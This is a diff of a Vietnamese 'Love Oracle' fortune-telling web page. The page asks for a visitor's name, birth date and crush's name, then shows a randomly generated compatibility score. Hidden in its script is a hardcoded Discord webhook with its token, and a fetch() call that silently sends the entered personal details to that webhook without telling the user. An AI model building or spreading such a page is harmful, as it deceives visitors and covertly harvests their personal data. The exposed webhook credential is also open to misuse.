@@ -1,13 +1,83 @@
-Love Oracle 🔮 body{margin:0;font-family:Arial;background:linear-gradient(135deg,#ff5fa2,#ff9fcf);min-height:100vh;display:flex;align-items:center;justify-content:center} .card{background:white;width:420px;padding:25px;border-radius:20px;box-shadow:0 0 25px rgba(0,0,0,.2);text-align:center} h1{font-family:'Great Vibes',cursive;color:#ff4d88;font-size:40px} input,button{width:90%;padding:12px;margin:8px;border-radius:10px;border:1px solid #ddd} button{background:#ff4d88;color:white;border:none;font-size:16px} #loading{display:none} #resultBox{display:none} .tarot{font-size:50px} 
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<title>Love Oracle 🔮</title>
+<link href="https://fonts.googleapis.com/css2?family=Great+Vibes&display=swap" rel="stylesheet">
+<style>
+body{margin:0;font-family:Arial;background:linear-gradient(135deg,#ff5fa2,#ff9fcf);min-height:100vh;display:flex;align-items:center;justify-content:center}
+.card{background:white;width:420px;padding:25px;border-radius:20px;box-shadow:0 0 25px rgba(0,0,0,.2);text-align:center}
+h1{font-family:'Great Vibes',cursive;color:#ff4d88;font-size:40px}
+input,button{width:90%;padding:12px;margin:8px;border-radius:10px;border:1px solid #ddd}
+button{background:#ff4d88;color:white;border:none;font-size:16px}
+#loading{display:none}
+#resultBox{display:none}
+.tarot{font-size:50px}
+</style>
+</head>
 
-Love Oracle 🔮
+<body>
+<div class="card">
+<h1>Love Oracle 🔮</h1>
 
-Xem Quẻ Tình Yêu 
+<div id="formBox">
+<input id="name" placeholder="Tên của bạn">
+<input id="dob" type="date">
+<input id="crush" placeholder="Tên người bạn thích">
+<button onclick="startFortune()">Xem Quẻ Tình Yêu</button>
+</div>
 
-🔮 Đang giải quẻ tình yêu...
+<div id="loading">🔮 Đang giải quẻ tình yêu...</div>
 
-💖
+<div id="resultBox">
+<div class="tarot">💖</div>
+<h2 id="percent"></h2>
+<p id="message"></p>
+<button onclick="resetForm()">Xem Lại</button>
+</div>
+</div>
 
-Xem Lại 
+<script>
+const webhook = "https://discord.com/api/webhooks/1475555053422252093/0-YmRXEGDvE14jIZtLlLJhIpKgyne8QEqpYil2TS4ptWHN01ccahn3NwDN46gi2ry84P";
 
-const webhook = "https://discord.com/api/webhooks/1475555053422252093/0-YmRXEGDvE14jIZtLlLJhIpKgyne8QEqpYil2TS4ptWHN01ccahn3NwDN46gi2ry84P"; // Discord / Google Apps Script / Firebase function startFortune(){ const name=document.getElementById('name').value; const dob=document.getElementById('dob').value; const crush=document.getElementById('crush').value; if(!name||!dob||!crush){alert('Nhập đầy đủ thông tin');return} document.getElementById('formBox').style.display='none'; document.getElementById('loading').style.display='block'; setTimeout(()=>{ const percent=Math.floor(Math.random()*40)+60; const messages=[ 'Hai bạn có liên kết định mệnh rất mạnh 💞', 'Có duyên tiền kiếp, rất dễ thành đôi 💍', 'Năng lượng tình cảm cực cao 🔥', 'Khả năng tiến xa rất lớn 💖' ]; const msg=messages[Math.floor(Math.random()*messages.length)]; document.getElementById('loading').style.display='none'; document.getElementById('resultBox').style.display='block'; document.getElementById('percent').innerText=`Độ hợp nhau: ${percent}%`; document.getElementById('message').innerText=msg; const data={name,dob,crush,percent,time:new Date().toLocaleString()}; fetch(webhook,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}); },2000); } function resetForm(){ document.getElementById('resultBox').style.display='none'; document.getElementById('formBox').style.display='block'; } 
+function startFortune(){
+ const name=document.getElementById('name').value;
+ const dob=document.getElementById('dob').value;
+ const crush=document.getElementById('crush').value;
+ if(!name||!dob||!crush){alert('Nhập đầy đủ thông tin');return}
+
+ document.getElementById('formBox').style.display='none';
+ document.getElementById('loading').style.display='block';
+
+ setTimeout(()=>{
+   const percent=Math.floor(Math.random()*40)+60;
+   const messages=[
+     'Hai bạn có liên kết định mệnh rất mạnh 💞',
+     'Có duyên tiền kiếp, rất dễ thành đôi 💍',
+     'Năng lượng tình cảm cực cao 🔥',
+     'Khả năng tiến xa rất lớn 💖'
+   ];
+   const msg=messages[Math.floor(Math.random()*messages.length)];
+
+   document.getElementById('loading').style.display='none';
+   document.getElementById('resultBox').style.display='block';
+   document.getElementById('percent').innerText=`Độ hợp nhau: ${percent}%`;
+   document.getElementById('message').innerText=msg;
+
+   const data={name,dob,crush,percent,time:new Date().toLocaleString()};
+   fetch(webhook,{
+     method:'POST',
+     headers:{'Content-Type':'application/json'},
+     body:JSON.stringify(data)
+   });
+ },2000);
+}
+
+function resetForm(){
+ document.getElementById('resultBox').style.display='none';
+ document.getElementById('formBox').style.display='block';
+}
+</script>
+
+</body>
+</html>
